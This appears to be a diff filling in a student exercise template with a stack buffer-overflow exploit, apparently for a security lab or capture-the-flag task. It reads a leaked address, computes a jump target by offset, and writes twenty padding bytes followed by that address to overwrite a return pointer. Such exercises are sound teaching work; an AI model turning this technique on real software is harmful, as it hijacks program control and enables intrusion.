@@ -26,3 +26,10 @@ def eprint(*args, **kwargs):
     print(*args, file=sys.stderr, **kwargs)
 
 # TODO: Implement your solution here.
+main_adress = int(sys.stdin.readline(), 16)
+offset = 151
+adress_to_jump = main_adress - offset
+writeStr("T"*20)
+writeLong(adress_to_jump)
+writeStr("\n")
+writeStr("Tomas")
